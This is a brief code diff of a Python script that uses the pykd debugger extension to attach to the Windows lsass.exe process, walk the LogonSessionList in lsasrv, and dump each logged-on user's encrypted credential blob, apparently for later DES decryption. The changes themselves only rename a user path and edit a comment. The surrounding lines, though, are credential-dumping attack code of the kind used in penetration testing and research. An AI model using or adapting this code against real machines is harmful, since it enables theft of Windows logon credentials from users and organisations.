@@ -3,8 +3,8 @@ import time
 from pyDes import *
 from binascii import unhexlify,hexlify
 
-#.load C:\Users\matteo\Desktop\pykd\pykd.dll
-# !py c:\users\matteo\desktop\lsass.py
+#.load C:\Users\uf0\Desktop\pykd\pykd.dll
+# !py c:\users\uf0\desktop\lsass.py
 blob = pykd.dbgCommand("!process 0 0 lsass.exe")
 eproc =  blob.split(' ')[1]
 cmd1 = ".process /i /p /r %s" % eproc
@@ -28,7 +28,7 @@ first_logondomain = first_user_data_neato[1].split('  ')[1]
 crypto_blob = pykd.dbgCommand("!list -x \"db poi(poi(@$extret+0x108)+0x10)+0x30 L1B0\" poi(lsasrv!LogonSessionList)")
 # parse it and polish it
 crypto_pretty = crypto_blob.split('\n\n')
-# saves the first two users' blob
+# saves the first user's blob
 first_user_crypto  = crypto_pretty[0]
 
 # dump encrypted bytes of the 1st user
